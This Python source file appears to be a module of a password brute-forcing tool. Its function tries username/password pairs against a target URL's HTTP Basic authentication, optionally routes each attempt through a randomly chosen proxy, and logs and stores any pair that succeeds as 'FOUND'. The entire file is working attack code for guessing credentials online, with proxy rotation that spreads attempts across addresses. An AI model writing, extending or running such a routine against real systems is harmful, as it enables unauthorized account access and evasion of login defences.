from libs.mbrowser import Browser
from utils import events
from cores.actions import randomFromList


# https://stackoverflow.com/a/4089075

def submit(options, loginInfo, creds, result):
	tryPassword, tryUsername = creds
	
	realm, _ = loginInfo
	if tryUsername in [x[1] for x in list(result.queue)]:
		return True
	
	try:
		proc = Browser()
		if options.proxy:
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""
		# proc.httpget_passwd(options.url, tryUsername, tryPassword, realm) # BUG
		resp = proc.open_url(options.url, auth = (tryUsername, tryPassword))
		if options.verbose:
			events.warn("['%s']['%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "TRY")
		
		if resp.status_code == 401:
			if options.verbose:
				events.fail("['%s':'%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr))
		elif resp.status_code > 400:
			events.error("[%s] ['%s': '%s']" % (proc.url(), tryUsername, tryPassword), "%s" % (resp.status_code))
		else:
			events.success("['%s':'%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "FOUND")
			result.put([options.url, tryUsername, tryPassword])
	
	except Exception as err:
		events.error("%s" % (err), "BRUTE")
		return False
